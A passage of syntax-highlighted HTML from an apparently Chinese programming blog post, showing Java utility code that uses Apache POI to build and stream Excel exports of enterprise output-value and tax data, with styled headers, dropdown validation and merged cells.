string">"联系方式"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"纳税申报销售额区间（万元）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"备注"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 所属镇下拉框</span>            <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>sheet<span class="token punctuation">,</span> deptList<span class="token punctuation">,</span> <span class="token string">"所属镇"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 所属行业下拉框</span>            <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>sheet<span class="token punctuation">,</span>industryList<span class="token punctuation">,</span> <span class="token string">"行业大类"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置输出流信息</span>            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/octet-stream;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename=file.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Pargam"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建输出流</span>            OutputStream outputStream <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 将Workbook写入输出流</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 关闭Workbook和输出流</span>            workbook<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置表头样式     *     * @Author: CZM     * @Param: [cell, workbook]     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setCellStyle</span><span class="token punctuation">(</span>HSSFCell cell<span class="token punctuation">,</span> HSSFWorkbook workbook<span class="token punctuation">)</span> <span class="token punctuation">{</span>        CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 填充色</span>        style<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>GREY_40_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 字体</span>        Font font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 颜色</span>        font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 加粗</span>        font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//字体为宋体</span>        font<span class="token punctuation">.</span><span class="token function">setFontName</span><span class="token punctuation">(</span><span class="token string">"宋体"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置样式对齐方式：水平垂直居中</span>        style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="自定义EXCEL"><a href="#自定义EXCEL" class="headerlink" title="自定义EXCEL"></a>自定义EXCEL</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>bdt<span class="token punctuation">.</span>resource<span class="token punctuation">.</span>utils<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>intern<span class="token punctuation">.</span>InternUtil<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>bdt<span class="token punctuation">.</span>resource<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>req<span class="token punctuation">.</span>EntProductionValueStatisticsV2<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>bdt<span class="token punctuation">.</span>resource<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>resp<span class="token punctuation">.</span>EntProductionValueExcelVo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>bdt<span class="token punctuation">.</span>resource<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>EntProductionValueDetail<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>SneakyThrows<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>time<span class="token punctuation">.</span>DateFormatUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>time<span class="token punctuation">.</span>DateUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>HSSFCellStyle<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>HSSFSheet<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HSSFColor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>util<span class="token punctuation">.</span>CellRangeAddress<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>streaming<span class="token punctuation">.</span>SXSSFCell<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>streaming<span class="token punctuation">.</span>SXSSFRow<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>streaming<span class="token punctuation">.</span>SXSSFSheet<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>streaming<span class="token punctuation">.</span>SXSSFWorkbook<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFCellStyle<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>text<span class="token punctuation">.</span>DecimalFormat<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>time<span class="token punctuation">.</span>LocalDate<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>UUID<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author chenZM * @since 2023-02-23 16:34:54 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyExcelUtil</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@SneakyThrows</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exportExcel</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>EntProductionValueExcelVo<span class="token operator">></span> list<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//  数据写入集合</span>        SXSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SXSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SXSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"企业产值信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer startRow <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//计算Excel有多少列</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> entField <span class="token operator">=</span> EntProductionValueExcelVo<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//处理Excel标题</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//第六七列,一二行合并</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//列宽</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"统一社会信用代码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"总投资(万元)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"总产值(万元)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"总税收(万元)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"更新时间"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"企业产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            startRow<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//列宽</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"月份"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"产值(万元)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"同比"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"环比"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            startRow<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//存入数据</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                EntProductionValueExcelVo vo <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                List<span class="token operator">&lt;</span>EntProductionValueDetail<span class="token operator">></span> detailList <span class="token operator">=</span> vo<span class="token punctuation">.</span><span class="token function">getDetailList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span> startRow <span class="token operator">+</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> detailList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        EntProductionValueDetail detail <span class="token operator">=</span> detailList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                        SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token 